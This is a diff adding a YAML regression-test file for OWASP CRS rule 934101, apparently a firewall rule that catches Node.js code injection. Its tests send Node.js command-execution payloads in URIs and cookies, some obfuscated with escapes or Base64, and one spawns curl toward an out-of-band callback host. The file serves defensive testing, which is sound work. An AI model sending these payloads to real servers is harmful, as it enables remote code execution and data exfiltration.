@@ -1,0 +1,172 @@
+---
+meta:
+  author: "rekter0"
+  enabled: true
+  name: "934101.yaml"
+  description: "Tests for rule 934101"
+tests:
+  - test_title: 934101-1
+    desc: additional node ssti tests 1
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?foo=%23%7Brequire.main.constructor._load%28child_process%29.spawn%28%27foo%27%2C%5B%27bar%27%2C%27bar%27%5D%29%7D
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-2
+    desc: additional node ssti tests 2
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?foo=%23%7Brequire.main.constructor._load%28%27fs%27%29.write%28fd%2C%20str%2C%200%2C%20null%2C%20%7B%7D%29%7D
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-3
+    desc: additional node ssti tests 3
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?foo=%23%7Brequire.main.constructor._load%28%27child_process%27%29.fork%28%22binary%22%2C%20%5B%22bar%22%5D%2C%20%7B%7D%29%7D
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-4
+    desc: require child_process
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?foo=require("child_process").exec('whoami')
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-5
+    desc: require child_process spawn
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /rce/lol%3drequire%3bx%3d"child_process"%3blol(x).spawn('curl',+['5gmgdi7mjd5o3g8oj8gawq6n8ee5ht6.oastify.com'])%3b
+            version: HTTP/1.0
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-6
+    desc: "Detect example payload require(... submitted as plaintext"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: test_cookie=require("child_process").exec('whoami')
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-7
+    desc: "Detect example payload require(... submitted as plaintext with JavaScript escape sequence obfuscation"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: test_cookie=\u0072\u0065quire("child_process").exec('whoami')
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-8
+    desc: "Detect example payload require(... submitted as plaintext that has been Base64 encoded"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: test_cookie=cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoJ3dob2FtaScpCg==
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-9
+    desc: "Detect example payload require(... submitted as plaintext with JavaScript escape sequence obfuscation that has been Base64 encoded"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: test_cookie=XHUwMDcyXHUwMDY1cXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCd3aG9hbWknKQo=
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            log_contains: id "934101"
+  - test_title: 934101-10
+    desc: "Detect example payload require(... submitted as plaintext that has been Base64 encoded and then obfuscated with JavaScript escape sequences"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: test_cookie=\u0063\u006dVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoJ3dob2FtaScpCg==
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            log_contains: id "934101"
